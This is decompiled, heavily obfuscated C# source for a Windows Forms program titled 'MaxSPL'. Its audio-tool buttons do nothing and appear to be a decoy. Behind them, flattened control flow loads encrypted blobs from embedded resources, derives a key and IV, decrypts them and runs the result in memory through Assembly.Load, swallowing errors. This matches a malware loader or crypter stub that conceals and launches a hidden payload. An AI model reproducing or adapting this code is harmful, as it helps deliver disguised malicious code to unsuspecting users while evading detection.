using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using ns1;
using ns2;
using ns4;
using ns6;

namespace ns0;

internal sealed class Form1 : Form
{
	[CompilerGenerated]
	private sealed class Class0
	{
		public int[] int_0;

		public Predicate<int[]> predicate_0;

		internal bool method_0(int[] int_1)
		{
			if (int_1[0] == int_0[0])
			{
				while (true)
				{
					int num = 275615193;
					while (true)
					{
						int num2 = num;
						uint num3;
						switch ((num3 = (uint)(~(-num2 ^ 0x1BDE1967))) % 6u)
						{
						case 5u:
						{
							int num8;
							int num9;
							if (int_1[3] == int_0[3])
							{
								num8 = -1009274410;
								num9 = -1009274410;
							}
							else
							{
								num8 = -1891214806;
								num9 = -1891214806;
							}
							num = num8 ^ ((int)num3 * -1776714574);
							continue;
						}
						case 3u:
						{
							int num6;
							int num7;
							if (int_1[2] == int_0[2])
							{
								num6 = 388183893;
								num7 = 388183893;
							}
							else
							{
								num6 = 1486216372;
								num7 = 1486216372;
							}
							num = num6 ^ (int)(num3 * 1318570280);
							continue;
						}
						case 1u:
						{
							int num4;
							int num5;
							if (int_1[1] != int_0[1])
							{
								num4 = 1240042546;
								num5 = 1240042546;
							}
							else
							{
								num4 = 2139053379;
								num5 = 2139053379;
							}
							num = num4 ^ ((int)num3 * -1180547646);
							continue;
						}
						case 0u:
							break;
						case 4u:
							return int_1[4] == int_0[4];
						default:
							goto end_IL_00ca;
						}
						break;
					}
					continue;
					end_IL_00ca:
					break;
				}
			}
			return false;
		}
	}

	private static Class3 class3_0;

	private Random random_0 = new Random();

	private IContainer icontainer_0;

	private ListView listView1;

	private ColumnHeader columnHeader_0;

	private ColumnHeader columnHeader_1;

	private ColumnHeader columnHeader_2;

	private Button button1;

	private Button button2;

	private Button button3;

	private ColumnHeader columnHeader_3;

	private ColumnHeader columnHeader_4;

	private Button button4;

	private Button button5;

	private Button button6;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		method_1();
	}

	private unsafe void method_0(ref int[] int_0)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = int_0.Length;
		while (true)
		{
			int num;
			int num2;
			if (*(int*)ptr > 1)
			{
				num = 1757556771;
				num2 = 1757556771;
			}
			else
			{
				num = 1387347732;
				num2 = 1387347732;
			}
			while (true)
			{
				int num3 = num;
				uint num4;
				switch ((num4 = (uint)(-1303454597 - (num3 * 1190893597 - 1478293545))) % 4u)
				{
				case 2u:
					num = 1757556771;
					continue;
				case 1u:
					(*(int*)ptr)--;
					*(int*)((byte*)ptr + 4) = random_0.Next(*(int*)ptr + 1);
					*(int*)((byte*)ptr + 8) = int_0[*(int*)((byte*)ptr + 4)];
					int_0[*(int*)((byte*)ptr + 4)] = int_0[*(int*)ptr];
					int_0[*(int*)ptr] = *(int*)((byte*)ptr + 8);
					num = -639220279;
					continue;
				default:
					return;
				case 3u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	private void method_1()
	{
		int[] int_2 = new int[5] { 0, 1, 2, 3, 4 };
		method_0(ref int_2);
		List<int[]> list = new List<int[]>();
		int num = 0;
		while (true)
		{
			int num2;
			int num3;
			if (num >= 133)
			{
				num2 = 537764794;
				num3 = 537764794;
			}
			else
			{
				num2 = 1183157571;
				num3 = 1183157571;
			}
			while (true)
			{
				int num4 = num2;
				uint num5;
				switch ((num5 = (uint)(~(~num4))) % 7u)
				{
				case 6u:
					method_0(ref int_2);
					num2 = 1649326782;
					continue;
				case 5u:
				{
					int num6;
					if (list.Exists(delegate(int[] int_1)
					{
						if (int_1[0] == int_2[0])
						{
							while (true)
							{
								int num7 = 275615193;
								while (true)
								{
									int num8 = num7;
									uint num9;
									switch ((num9 = (uint)(~(-num8 ^ 0x1BDE1967))) % 6u)
									{
									case 5u:
									{
										int num14;
										int num15;
										if (int_1[3] == int_2[3])
										{
											num14 = -1009274410;
											num15 = -1009274410;
										}
										else
										{
											num14 = -1891214806;
											num15 = -1891214806;
										}
										num7 = num14 ^ ((int)num9 * -1776714574);
										continue;
									}
									case 3u:
									{
										int num12;
										int num13;
										if (int_1[2] == int_2[2])
										{
											num12 = 388183893;
											num13 = 388183893;
										}
										else
										{
											num12 = 1486216372;
											num13 = 1486216372;
										}
										num7 = num12 ^ (int)(num9 * 1318570280);
										continue;
									}
									case 1u:
									{
										int num10;
										int num11;
										if (int_1[1] != int_2[1])
										{
											num10 = 1240042546;
											num11 = 1240042546;
										}
										else
										{
											num10 = 2139053379;
											num11 = 2139053379;
										}
										num7 = num10 ^ ((int)num9 * -1180547646);
										continue;
									}
									case 0u:
										break;
									case 4u:
										return int_1[4] == int_2[4];
									default:
										goto end_IL_00ca;
									}
									break;
								}
								continue;
								end_IL_00ca:
								break;
							}
						}
						return false;
					}))
					{
						num2 = 557849221;
						num6 = 557849221;
					}
					else
					{
						num2 = 1616944158;
						num6 = 1616944158;
					}
					continue;
				}
				case 4u:
					list.Add((int[])int_2.Clone());
					Class6.smethod_1(int_2);
					num++;
					num2 = (int)(num5 * 673322297) ^ -1642541470;
					continue;
				case 2u:
					num2 = 1183157571;
					continue;
				case 1u:
					class3_0 = new Class3();
					num2 = 557849221;
					continue;
				default:
					return;
				case 3u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	public static void smethod_0()
	{
		IDictionaryEnumerator enumerator = Class8.ResourceManager_0.GetResourceSet(CultureInfo.CurrentCulture, createIfNotExists: true, tryParents: true)!.GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				DictionaryEntry dictionaryEntry = (DictionaryEntry)enumerator.Current;
				try
				{
					class3_0.list_1.Add(new MemoryStream((byte[])dictionaryEntry.Value));
				}
				catch
				{
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable disposable)
			{
				while (true)
				{
					IL_009c:
					int num = -1377627700;
					while (true)
					{
						int num2 = num;
						uint num3;
						switch ((num3 = (uint)(-(-599245995 - (num2 + 1383138983)))) % 3u)
						{
						case 1u:
							goto IL_0061;
						default:
							goto end_IL_0074;
						case 0u:
							break;
						case 2u:
							goto end_IL_0074;
						}
						goto IL_009c;
						IL_0061:
						disposable.Dispose();
						num = (int)((num3 * 82178106) ^ 0x5A0FE35A);
						continue;
						end_IL_0074:
						break;
					}
					break;
				}
			}
		}
	}

	public unsafe static void smethod_1()
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = 0;
		Class1 @class = default(Class1);
		byte[] array2 = default(byte[]);
		byte[] array = default(byte[]);
		while (true)
		{
			int num = -1331571592;
			while (true)
			{
				int num2 = num;
				uint num3;
				switch ((num3 = (uint)(-(~num2) * -1791511173)) % 8u)
				{
				case 7u:
					@class = new Class1(*(int*)ptr);
					array2 = new byte[16];
					*(int*)((byte*)ptr + 8) = 0;
					num = (int)(num3 * 344023219) ^ -1473071537;
					continue;
				case 6u:
				{
					int num5;
					if (*(int*)((byte*)ptr + 4) < 32)
					{
						num = -728189597;
						num5 = -728189597;
					}
					else
					{
						num = 1691750924;
						num5 = 1691750924;
					}
					continue;
				}
				case 4u:
					array[*(int*)((byte*)ptr + 4)] = @class.method_0();
					(*(int*)((byte*)ptr + 4))++;
					num = 945649545;
					continue;
				case 3u:
					*(int*)ptr = -694262787;
					@class = new Class1(1379079230);
					array = new byte[32];
					*(int*)((byte*)ptr + 4) = 0;
					num = (int)(num3 * 1128006362) ^ -1823324601;
					continue;
				case 2u:
					array2[*(int*)((byte*)ptr + 8)] = @class.method_0();
					(*(int*)((byte*)ptr + 8))++;
					num = -1170479806;
					continue;
				case 1u:
				{
					int num4;
					if (*(int*)((byte*)ptr + 8) >= 16)
					{
						num = -2013822746;
						num4 = -2013822746;
					}
					else
					{
						num = -1013813459;
						num4 = -1013813459;
					}
					continue;
				}
				case 0u:
					break;
				default:
					class3_0.method_0(array);
					class3_0.method_1(array2);
					return;
				}
				break;
			}
		}
	}

	private unsafe static int smethod_2(Stream stream_0, int int_0)
	{
		void* ptr = stackalloc byte[12];
		stream_0.Seek(int_0, SeekOrigin.Begin);
		byte[] array = new byte[4];
		stream_0.Read(array, 0, 4);
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 0;
		while (true)
		{
			int num;
			int num2;
			if (*(int*)((byte*)ptr + 4) >= 4)
			{
				num = 1289902174;
				num2 = 1289902174;
			}
			else
			{
				num = 1045556239;
				num2 = 1045556239;
			}
			while (true)
			{
				int num3 = num;
				uint num4;
				switch ((num4 = (uint)(~(num3 ^ -1042819184)) ^ 0xD796F43u) % 4u)
				{
				case 3u:
					*(int*)ptr |= array[*(int*)((byte*)ptr + 4)] << *(int*)((byte*)ptr + 4) * 8;
					(*(int*)((byte*)ptr + 4))++;
					num = 1528177121;
					continue;
				case 0u:
					num = 1045556239;
					continue;
				case 1u:
					break;
				default:
					*(int*)((byte*)ptr + 8) = *(int*)ptr;
					return *(int*)((byte*)ptr + 8);
				}
				break;
			}
		}
	}

	public static void smethod_3()
	{
		foreach (MemoryStream item in class3_0.list_1)
		{
			try
			{
				class3_0.class2_0.Byte_1 = class3_0.method_8();
				class3_0.class2_0.Byte_0 = class3_0.method_7();
				byte[] array = new byte[smethod_2(item, 1) ^ smethod_2(item, 5)];
				item.Read(array, 0, array.Length);
				while (true)
				{
					IL_00da:
					int num = 1664694076;
					while (true)
					{
						int num2 = num;
						uint num3;
						int num4;
						switch ((num3 = (uint)(num2 * -2018280843 * 1405426571 - 573969458)) % 4u)
						{
						case 2u:
						{
							class3_0.method_6(array);
							int num5;
							if (!class3_0.method_2())
							{
								num4 = 1689725047;
								num5 = 1689725047;
							}
							else
							{
								num4 = -8677615;
								num5 = -8677615;
							}
							goto IL_00a0;
						}
						default:
							return;
						case 0u:
							break;
						case 1u:
							return;
						case 3u:
							goto end_IL_00a9;
						}
						goto IL_00da;
						IL_00a0:
						num = num4 ^ ((int)num3 * -1812118244);
						continue;
						end_IL_00a9:
						break;
					}
					break;
				}
			}
			catch
			{
				class3_0.method_6(null);
			}
		}
	}

	public static void smethod_4()
	{
		try
		{
			if (!class3_0.method_2())
			{
				int num = -1080861286;
				uint num2 = 534547900u;
			}
			else
			{
				class3_0.method_4(Assembly.Load(class3_0.method_3()));
			}
		}
		catch
		{
		}
	}

	public static void smethod_5()
	{
		class3_0.method_10();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		throw new NotImplementedException();
	}

	private void button2_Click(object sender, EventArgs e)
	{
		throw new NotImplementedException();
	}

	private void button3_Click(object sender, EventArgs e)
	{
		throw new NotImplementedException();
	}

	private void button5_Click(object sender, EventArgs e)
	{
		throw new NotImplementedException();
	}

	private void button6_Click(object sender, EventArgs e)
	{
		throw new NotImplementedException();
	}

	void Form.Dispose(bool disposing)
	{
		if (disposing)
		{
			while (true)
			{
				int num = 1244082116;
				while (true)
				{
					int num2 = num;
					uint num3;
					switch ((num3 = (uint)(num2 - -524002472 - -130124297)) % 4u)
					{
					case 2u:
						Environment.Exit(0);
						icontainer_0.Dispose();
						num = ((int)num3 * -1830870921) ^ -223472724;
						continue;
					case 1u:
					{
						int num4;
						int num5;
						if (icontainer_0 == null)
						{
							num4 = -1096170474;
							num5 = -1096170474;
						}
						else
						{
							num4 = 1992127557;
							num5 = 1992127557;
						}
						num = num4 ^ ((int)num3 * -1233373972);
						continue;
					}
					case 0u:
						break;
					default:
						goto end_IL_0075;
					}
					break;
				}
				continue;
				end_IL_0075:
				break;
			}
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		listView1 = new ListView();
		columnHeader_0 = new ColumnHeader();
		columnHeader_1 = new ColumnHeader();
		columnHeader_2 = new ColumnHeader();
		button1 = new Button();
		button2 = new Button();
		button3 = new Button();
		columnHeader_3 = new ColumnHeader();
		columnHeader_4 = new ColumnHeader();
		button4 = new Button();
		button5 = new Button();
		button6 = new Button();
		((Control)this).SuspendLayout();
		while (true)
		{
			int num = 1770526840;
			while (true)
			{
				int num2 = num;
				uint num3;
				switch ((num3 = (uint)(num2 - -348648910) ^ 0x66937AF1u) % 9u)
				{
				case 8u:
					((ButtonBase)button4).set_UseVisualStyleBackColor(true);
					((Control)button5).set_Location(new Point(177, 12));
					((Control)button5).set_Name("button5");
					((Control)button5).set_Size(new Size(159, 31));
					((Control)button5).set_TabIndex(23);
					((Control)button5).set_Text("From File");
					((ButtonBase)button5).set_UseVisualStyleBackColor(true);
					((Control)button5).add_Click((EventHandler)button5_Click);
					((Control)button6).set_Location(new Point(342, 12));
					((Control)button6).set_Name("button6");
					num = (int)(num3 * 1357810612) ^ -257553038;
					continue;
				case 6u:
					((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
					((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
					((Form)this).set_ClientSize(new Size(788, 537));
					((Control)this).get_Controls().Add((Control)(object)button6);
					((Control)this).get_Controls().Add((Control)(object)button5);
					((Control)this).get_Controls().Add((Control)(object)button4);
					((Control)this).get_Controls().Add((Control)(object)button3);
					((Control)this).get_Controls().Add((Control)(object)button2);
					((Control)this).get_Controls().Add((Control)(object)button1);
					((Control)this).get_Controls().Add((Control)(object)listView1);
					((Form)this).set_FormBorderStyle((FormBorderStyle)1);
					((Control)this).set_Name("Form1");
					((Control)this).set_Text("MaxSPL");
					((Form)this).add_Load((EventHandler)Form1_Load);
					((Control)this).ResumeLayout(false);
					num = ((int)num3 * -1939005901) ^ 0x65D1BFB;
					continue;
				case 4u:
					((Control)button2).set_Name("button2");
					((Control)button2).set_Size(new Size(111, 25));
					((Control)button2).set_TabIndex(20);
					((Control)button2).set_Text("Clear RTable");
					((ButtonBase)button2).set_UseVisualStyleBackColor(true);
					((Control)button2).add_Click((EventHandler)button2_Click);
					num = ((int)num3 * -1722499779) ^ 0x1637E5CD;
					continue;
				case 3u:
					((ButtonBase)button3).set_UseVisualStyleBackColor(true);
					((Control)button3).add_Click((EventHandler)button3_Click);
					columnHeader_3.set_Text("P-VAR");
					columnHeader_4.set_Text("MIN");
					((Control)button4).set_Location(new Point(12, 12));
					((Control)button4).set_Name("button4");
					((Control)button4).set_Size(new Size(159, 31));
					((Control)button4).set_TabIndex(22);
					((Control)button4).set_Text("Insert Random Data");
					num = (int)(num3 * 151388796) ^ -1608827717;
					continue;
				case 2u:
					listView1.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[5] { columnHeader_0, columnHeader_1, columnHeader_2, columnHeader_3, columnHeader_4 });
					listView1.set_FullRowSelect(true);
					listView1.set_GridLines(true);
					((Control)listView1).set_Location(new Point(12, 64));
					((Control)listView1).set_Name("listView1");
					((Control)listView1).set_Size(new Size(750, 429));
					((Control)listView1).set_TabIndex(18);
					listView1.set_UseCompatibleStateImageBehavior(false);
					listView1.set_View((View)1);
					columnHeader_0.set_Text("Resolution");
					columnHeader_0.set_Width(136);
					columnHeader_1.set_Text("MAX");
					columnHeader_1.set_Width(248);
					columnHeader_2.set_Text("Q-VAR");
					columnHeader_2.set_Width(484);
					((Control)button1).set_Location(new Point(12, 499));
					((Control)button1).set_Name("button1");
					((Control)button1).set_Size(new Size(111, 25));
					((Control)button1).set_TabIndex(19);
					((Control)button1).set_Text("Maximize Pulses");
					((ButtonBase)button1).set_UseVisualStyleBackColor(true);
					((Control)button1).add_Click((EventHandler)button1_Click);
					((Control)button2).set_Location(new Point(129, 499));
					num = (int)((num3 * 541834143) ^ 0x2AD9CE45);
					continue;
				case 1u:
					((Control)button3).set_Location(new Point(246, 499));
					((Control)button3).set_Name("button3");
					((Control)button3).set_Size(new Size(111, 25));
					((Control)button3).set_TabIndex(21);
					((Control)button3).set_Text("Increase P");
					num = ((int)num3 * -936619825) ^ -2083706333;
					continue;
				case 0u:
					((Control)button6).set_Size(new Size(159, 31));
					((Control)button6).set_TabIndex(24);
					((Control)button6).set_Text("Use Complex-Algorithm");
					((ButtonBase)button6).set_UseVisualStyleBackColor(true);
					((Control)button6).add_Click((EventHandler)button6_Click);
					num = (int)(num3 * 1890719895) ^ -68022185;
					continue;
				default:
					return;
				case 5u:
					break;
				case 7u:
					return;
				}
				break;
			}
		}
	}
}
